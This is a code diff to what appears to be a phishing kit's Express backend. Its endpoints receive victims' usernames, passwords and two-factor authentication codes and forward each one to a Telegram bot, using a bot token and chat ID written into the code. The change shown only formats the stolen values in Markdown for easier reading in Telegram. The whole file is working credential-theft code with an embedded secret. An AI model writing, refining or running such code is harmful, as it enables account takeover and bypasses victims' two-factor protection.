@@ -28,13 +28,14 @@ app.post('/send-user', async (req, res) => {
     if (!usuariosData[dispositivoID]) {
         usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
     }
-    usuariosData[dispositivoID].usuario = `Usuario ${dispositivoID}: ${usuario}`;
+    usuariosData[dispositivoID].usuario = `Usuario ${dispositivoID}: \`${usuario}\``;
 
     await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
             chat_id: '7891046852',
             text: usuariosData[dispositivoID].usuario,
+            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
         headers: { 'Content-Type': 'application/json' },
     });
@@ -47,7 +48,7 @@ app.post('/send-password', async (req, res) => {
 
     // Almacenar la contraseña por dispositivo
     if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].contraseña = `Contraseña ${dispositivoID}: ${password}`;
+        usuariosData[dispositivoID].contraseña = `Contraseña ${dispositivoID}: \`${password}\``;
     }
 
     await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
@@ -55,6 +56,7 @@ app.post('/send-password', async (req, res) => {
         body: JSON.stringify({
             chat_id: '7891046852',
             text: usuariosData[dispositivoID].contraseña,
+            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
         headers: { 'Content-Type': 'application/json' },
     });
@@ -67,7 +69,7 @@ app.post('/send-auth', async (req, res) => {
 
     // Almacenar el código de autenticación por dispositivo
     if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].codigo = `Autenticación ${dispositivoID}: ${authCode}`;
+        usuariosData[dispositivoID].codigo = `Autenticación ${dispositivoID}: \`${authCode}\``;
     }
 
     await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
@@ -75,6 +77,7 @@ app.post('/send-auth', async (req, res) => {
         body: JSON.stringify({
             chat_id: '7891046852',
             text: usuariosData[dispositivoID].codigo,
+            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
         headers: { 'Content-Type': 'application/json' },
     });
